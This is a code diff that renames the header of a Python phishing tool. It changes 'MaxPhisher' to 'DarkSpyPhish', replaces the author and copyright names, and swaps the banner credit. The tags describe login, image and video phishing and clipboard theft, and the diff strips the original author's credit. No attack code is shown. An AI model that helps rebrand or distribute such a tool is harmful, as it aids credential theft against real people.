@@ -1,14 +1,14 @@
 # -*- coding: UTF-8 -*-
-# ToolName   : MaxPhisher
-# Author     : KasRoudra
+# ToolName   : DarkSpyPhish
+# Author     : problems-arelifepartner
 # Version    : 1.1
 # License    : MIT
-# Copyright  : KasRoudra (2021-2022)
+# Copyright  : problems-arelifepartner (2021-2022)
 # Github     : https://github.com/KasRoudra
 # Contact    : https://m.me/KasRoudra
-# Description: MaxPhisher is a phishing tool in python
+# Description: DarkSpyPhish is a phishing tool in python
 # Tags       : Multi phishing, login phishing, image phishing, video phishing, clipboard steal
-# 1st Commit : 08/9/2022
+# 1st Commit : 02/1/2023
 # Language   : Python
 # Portable file/script
 # If you copy open source code, consider giving credit
@@ -19,7 +19,7 @@
 """
 MIT License
 
-Copyright (c) 2022 KasRoudra
+Copyright (c) 2023 problems-arelifepartner
 
 Permission is hereby granted, free of charge, to any person obtaining a copy
 of this software and associated documentation files (the "Software"), to deal
@@ -147,7 +147,7 @@ logo = f"""
 {blue}| |  | | (_| |>  <|  __/| | | | \__ \ | | |  __/ |
 {red}|_|  |_|\__,_/_/\_\_|   |_| |_|_|___/_| |_|\___|_|
 {yellow}{" "*31}             [{blue}v{version}{yellow}]
-{cyan}{" "*28}        [{blue}By {green}\x4b\x61\x73\x52\x6f\x75\x64\x72\x61{cyan}]
+{cyan}{" "*28}        [{blue}By {green}CYBER TECH{cyan}]
 """
 
 nr_help = f"""
